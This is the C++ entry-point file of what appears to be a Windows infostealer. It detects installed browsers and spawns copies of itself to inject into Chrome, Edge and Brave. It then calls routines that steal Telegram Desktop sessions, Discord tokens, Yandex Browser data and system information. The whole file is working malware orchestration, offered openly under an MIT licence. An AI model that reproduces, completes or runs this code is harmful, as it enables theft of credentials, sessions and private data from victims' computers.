// main.cpp
// github: github.com/s4yr3x
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "modules/data_collection/Ñhrome_Edge_Brave/browser_inject.h" // Chrome Browser, Microsoft Edge Browser, Brave Browser
#include "modules/data_collection/browser_manager.h" // core of the finding browsers
#include "modules/data_collection/telegram/telegram_module.h" // Telegram (Desktop Client, tdata)
#include "modules/data_collection/Discord/discord_module.h" // Discord (token + validation)
#include "modules/data_collection/Yandex/yandex_module.h" // Yandex Browser
#include "modules/data_collection/System/sys_module.h" // System Info

#include <Windows.h>
#include <shellapi.h>
#include <vector>

extern int InjectMain(int argc, wchar_t* argv[]);

int WINAPI wWinMain(
    HINSTANCE,
    HINSTANCE,
    PWSTR,
    int)
{
    int argc = 0;
    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv)
        return -1;

    if (argc >= 2)
    {
        int res = InjectMain(argc, argv);
        LocalFree(argv);
        return res;
    }

    std::vector<BrowserInfo> browsers = DetectBrowsers();

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    for (auto& b : browsers)
    {
        std::wstring cmd = L"\"" + std::wstring(exePath) + L"\" " + b.type;
        if (!b.isRunning)
            cmd += L" -s";

        STARTUPINFOW si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);

        if (CreateProcessW(
            NULL,
            cmd.data(),
            NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    DumpSystemInfo();
    ExtractTelegramSession();
    ExtractDiscordToken();
    ExtractYandexData();
    
    MessageBoxA(NULL, "hello", "finish", MB_OK);
    LocalFree(argv);
    return 0;
}
